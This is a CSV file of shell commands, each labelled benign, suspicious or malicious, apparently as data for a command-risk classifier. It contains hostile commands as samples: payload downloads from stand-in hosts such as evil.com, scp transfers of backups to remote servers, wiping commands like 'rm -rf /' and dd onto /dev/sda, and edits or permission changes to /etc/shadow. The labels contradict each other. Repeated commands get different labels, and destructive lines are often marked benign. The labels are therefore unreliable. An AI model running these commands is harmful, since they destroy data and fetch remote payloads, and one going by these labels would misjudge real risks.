command,label
env,SUSPICIOUS
grep root /etc/passwd,SUSPICIOUS
CURL   HTTPS://FILESHARE.COM/PAYLOAD.SH,BENIGN
sudo   -l,SUSPICIOUS
ps   aux | grep sshd,BENIGN
ls /root/ ,SUSPICIOUS
CAT WELCOME.TXT ,BENIGN
echo 'pwned' >> /etc/shadow,BENIGN
ifconfig,BENIGN
cat homework.txt,BENIGN
rm -rf /*   --no-preserve-root,MALICIOUS
whoami,BENIGN
ls   /root/,SUSPICIOUS
mkdir test,BENIGN
echo 'hacked' >> /etc/shadow,SUSPICIOUS
ps aux | grep sshd,BENIGN
 ifconfig,BENIGN
curl -O http://suspicious.org/payload.sh,BENIGN
df -h,BENIGN
touch homework.doc,BENIGN
find / -name 'test',BENIGN
echo 'hello',BENIGN
CAT /VAR/LOG/SYSLOG,SUSPICIOUS
 cat /home/user/info.txt,BENIGN
curl -O http://malicious.com/malware.bin,MALICIOUS
du -sh,BENIGN
curl -O http://evil.com/exploit.zip,BENIGN
echo 'malware' > /tmp/malware.sh,MALICIOUS
ssh -L 8080:target.com:80 attacker@remote,MALICIOUS
ping google.com,BENIGN
cat /root/.bashrc,BENIGN
ps aux,SUSPICIOUS
echo 'hello world',BENIGN
which python,SUSPICIOUS
iptables -F,MALICIOUS
 find / -name 'test',BENIGN
cd /root,SUSPICIOUS
cd /tmp/,MALICIOUS
wget http://evil.com/payload.sh,SUSPICIOUS
rm -rf /* --no-preserve-root,MALICIOUS
cat /etc/shadow,MALICIOUS
rm -rf   /home/user,SUSPICIOUS
cat /home/user/info.txt,BENIGN
dd if=/dev/zero of=/dev/sda,MALICIOUS
cat /etc/passwd,MALICIOUS
PING GOOGLE.COM ,BENIGN
scp   file.txt root@192.168.0.2:/root/,MALICIOUS
rm -rf /home/user,BENIGN
mv /bin/bash /tmp/bash,MALICIOUS
sudo apt install nmap,BENIGN
sudo su,SUSPICIOUS
CHMOD 777 /ETC/SHADOW,MALICIOUS
cat /var/log/syslog,MALICIOUS
netstat   -tulnp,SUSPICIOUS
wget http://malicious.com/payload.sh ,MALICIOUS
rm -rf /var/,BENIGN
ps aux | grep mysql,BENIGN
uname -a,SUSPICIOUS
dd if=/dev/zero   of=/dev/sda,MALICIOUS
watch netstat -an,SUSPICIOUS
cat .bashrc,BENIGN
curl https://safe-site.org/update.sh ,BENIGN
cat   notes.txt,BENIGN
scp data.tar.gz root@backup.server:/var/www,MALICIOUS
ls /root/,BENIGN
cat welcome.txt,BENIGN
scp   backup.sql root@backup.server:/tmp/,MALICIOUS
cat /home/user/todo.txt,BENIGN
wget http://malicious.com/payload.sh,MALICIOUS
history ,SUSPICIOUS
sudo su ,SUSPICIOUS
curl https://safe-site.org/update.sh,BENIGN
curl   https://evil.com/update.bin,MALICIOUS
sudo apt update ,BENIGN
PS   AUX,SUSPICIOUS
echo 'pwned' >> /var/log/syslog,SUSPICIOUS
 ECHO 'HELLO',BENIGN
 CAT /ROOT/.BASHRC,SUSPICIOUS
sudo apt install htop,MALICIOUS
ps   aux | grep mysql,SUSPICIOUS
PS AUX | GREP SSHD,SUSPICIOUS
 ECHO 'MALWARE' > /TMP/MALWARE.SH,MALICIOUS
cat ~/.ssh/known_hosts,SUSPICIOUS
ECHO 'PWNED' >> /ROOT/.BASHRC,BENIGN
MKDIR   TEST,BENIGN
curl   https://fileshare.com/exploit.zip,BENIGN
wget http://evil.com/update.bin,BENIGN
echo 'pwned' > /var/log/syslog,MALICIOUS
rm -rf /,MALICIOUS
cat notes.txt,BENIGN
ls /tmp/ ,SUSPICIOUS
echo   'pwned' > /var/log/syslog,SUSPICIOUS
echo 'hacked' >> /var/log/syslog,SUSPICIOUS
echo 'hacked' >   /root/.bashrc,MALICIOUS
grep   'password' /etc/passwd,MALICIOUS
wget http://suspicious.org/update.bin,MALICIOUS
chmod 777 /etc/shadow,MALICIOUS
echo 'owned' >> /var/log/syslog,BENIGN
pwd,BENIGN
ECHO   'OWNED' >> /ETC/SHADOW,SUSPICIOUS
curl https://suspicious.org/payload.sh,MALICIOUS
ls -al,BENIGN
echo   'malware' > /tmp/malware.sh,MALICIOUS
history,SUSPICIOUS
 watch netstat -an,SUSPICIOUS
cat /var/log/auth.log,SUSPICIOUS
wget http://fileshare.com/payload.sh,SUSPICIOUS
sudo -l,SUSPICIOUS
du   -sh,BENIGN
watch netstat   -an,SUSPICIOUS
iptables -f,MALICIOUS
ls /var/www,BENIGN
 ps aux | grep mysql,SUSPICIOUS
wget http://suspicious.org/exploit.zip,SUSPICIOUS
wget http://fileshare.com/exploit.zip,MALICIOUS
RM -RF   /,MALICIOUS
grep 'password' /etc/passwd,MALICIOUS
 curl -O http://suspicious.org/exploit.zip,MALICIOUS
chmod 777 /var/log/syslog,SUSPICIOUS
chmod 777 /root/.bashrc ,MALICIOUS
 ls /tmp/,SUSPICIOUS
ps aux | grep   sshd,SUSPICIOUS
echo 'hacked' > /var/log/syslog,MALICIOUS
top -n 1,BENIGN
 echo 'owned' >> /etc/shadow,SUSPICIOUS
curl https://evil.com/update.bin,MALICIOUS
 CAT NOTES.TXT,BENIGN
curl -o http://suspicious.org/exploit.zip ,MALICIOUS
ls /tmp/,SUSPICIOUS
